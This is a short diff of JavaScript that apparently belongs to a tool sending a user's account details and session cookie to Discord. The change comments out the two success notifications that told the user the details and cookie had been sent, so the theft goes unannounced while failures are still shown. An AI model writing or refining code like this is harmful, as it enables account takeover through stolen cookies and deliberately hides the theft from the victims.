@@ -1313,7 +1313,7 @@
                 
                 if (accountDetailsSent) {
                     console.log('Account details sent successfully');
-                    showToast('Success', 'Account details sent to Discord', true);
+                    // showToast("Success", "Account details sent to Discord", true);
                     
                     // Wait 3 seconds before sending the cookie
                     setTimeout(async () => {
@@ -1329,7 +1329,7 @@
                         
                         if (cookieSent) {
                             console.log('Cookie sent successfully');
-                            showToast('Success', 'Cookie sent to Discord', true);
+                            // showToast("Success", "Cookie sent to Discord", true);
                         } else {
                             console.error('Failed to send cookie');
                             showToast('Error', 'Failed to send cookie to Discord', false);
